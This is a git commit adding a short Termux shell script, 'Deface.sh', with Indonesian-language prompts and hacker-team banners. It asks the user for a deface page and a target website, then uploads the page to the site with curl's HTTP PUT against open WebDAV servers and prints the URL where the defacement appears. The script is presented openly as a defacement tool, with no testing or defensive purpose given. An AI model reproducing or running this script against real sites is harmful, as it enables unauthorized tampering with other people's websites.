5e9120f433b7238de29097c70f333146926e511c
Mrkasvi <52823705+Mrkasvi@users.noreply.github.com>
2019-07-14 22:41:35 +0700

    Add files via upload

---
+++ Deface.sh
@@ -0,0 +1,18 @@
+                                         
+figlet Webdav | lolcat
+figlet Mrkasvi | lolcat
+toilet -f slant --gay "WHI"
+echo "=========================================" | lolcat
+echo "creadted : Mrkasvi" | lolcat
+echo "Team.     : indonesiacyber" | lolcat
+echo "Github.   : https//github.com/Mrkasvi" | lolcat
+echo "# THANKS FOR ALLAH #" | lolcat
+echo "=========================================" | lolcat
+echo " "
+echo "pastikan script DEFACE diluar memori internal" | lolcat
+read -p "masukan nama script deface anda : " script;
+read -p "masukan nama web yang mau di deface: " web;
+echo " SEDANG MENDEFACE.................." | lolcat
+termux-setup-storage
+curl -T /sdcard/$scrip $web
+echo "Buka Hasilnya Disini $web/$script Semoga Sukses" | lolcat
